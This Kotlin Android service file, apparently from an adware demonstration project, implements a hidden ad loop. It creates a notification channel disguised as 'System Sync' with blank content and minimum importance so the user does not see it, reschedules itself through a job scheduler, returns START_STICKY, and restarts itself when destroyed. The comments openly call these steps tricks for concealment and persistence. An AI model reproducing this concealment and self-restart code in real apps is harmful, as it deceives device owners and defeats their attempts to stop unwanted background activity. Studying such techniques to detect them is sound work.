package com.saitawngpha.ghostaddemo.services

import android.app.*
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.saitawngpha.ghostaddemo.adjobscheduler.AdJobScheduler
import com.saitawngpha.ghostaddemo.adloopmanager.AdLoopManager
import kotlinx.coroutines.*

/**
 * Foreground service that creates an invisible, persistent notification
 * This ensures the app keeps running even when swiped away
 */
class ForegroundAdService : Service() {
    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val adLoopManager = AdLoopManager()

    override fun onCreate() {
        super.onCreate()
        startInvisibleForegroundNotification()
        beginAdLoop()
    }

    private fun startInvisibleForegroundNotification() {
        val channelId = "ghost_ad_channel"

        // Create notification channel for Android O+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "System Sync", // Generic name that seems system-related
                NotificationManager.IMPORTANCE_MIN // Min importance hides it from status bar
            ).apply {
                description = "Data synchronization service"
                setShowBadge(false)
            }
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }

        // Create a blank notification - the "invisible" trick
        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("") // Empty title
            .setContentText("")  // Empty content
            .setSmallIcon(android.R.drawable.ic_notification_clear_all) // Generic icon
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setShowWhen(false)
            .setSilent(true)
            .build()

        // Start foreground with ID 1 (unremovable)
        startForeground(1, notification)
    }

    private fun beginAdLoop() {
        serviceScope.launch {
            adLoopManager.startAdLoop()
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Reschedule JobScheduler to ensure persistence
        AdJobScheduler.scheduleAdJob(this)

        // Return sticky to auto-restart if killed
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        // Self-heal: restart service when destroyed
        val restartIntent = Intent(this, ForegroundAdService::class.java)
        startService(restartIntent)
    }

    override fun onBind(intent: Intent?): IBinder? = null
}